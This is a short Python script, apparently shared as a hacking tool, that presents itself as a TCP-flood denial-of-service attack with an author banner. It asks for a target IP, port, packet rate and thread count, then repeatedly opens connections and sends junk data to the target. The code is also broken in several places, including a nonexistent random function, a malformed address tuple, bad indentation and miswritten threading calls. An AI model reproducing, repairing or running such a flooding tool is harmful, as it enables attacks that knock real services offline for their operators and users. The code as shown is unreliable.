# DDOS TCP-FLOOD
#Created By AustinFennix

import socket
import random
import threading
import os

#################################################
os.system("clear")
print("""\x1b[1;92m

░█████╗░██╗░░░██╗░██████╗████████╗██╗███╗░░██╗░░░░░░██████╗░██╗░░░██╗
██╔══██╗██║░░░██║██╔════╝╚══██╔══╝██║████╗░██║░░░░░░██╔══██╗╚██╗░██╔╝
███████║██║░░░██║╚█████╗░░░░██║░░░██║██╔██╗██║█████╗██████╔╝░╚████╔╝░
██╔══██║██║░░░██║░╚═══██╗░░░██║░░░██║██║╚████║╚════╝██╔═══╝░░░╚██╔╝░░
██║░░██║╚██████╔╝██████╔╝░░░██║░░░██║██║░╚███║░░░░░░██║░░░░░░░░██║░░░
╚═╝░░╚═╝░╚═════╝░╚═════╝░░░░╚═╝░░░╚═╝╚═╝░░╚══╝░░░░░░╚═╝░░░░░░░░╚═╝░░░
 """)
print("﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋")
print("TCP-FLOOD BY AUSTIN")
print("DONT ABUSE BITCH")
print
print("﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋﹋")

ip = str(input(' [x] Target : '))
port = int(input(' [x] Port : '))
pack = int(input(' [x] Packet/s : '))
thread = int(input(' [x] Threads : '))

#################################################

def start():
	hh = random._unrandom(1024)
	xx = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip.port))
			s.send(hh)
			xx += 1
			print('AustinDDoS '+ip+' | Sent:'+str(xx))
		except:
		s.close()
		print('Closed Connection')

for x in range(thread):
	thred = threading.thread(target=start)
	thred =start()


###################################################

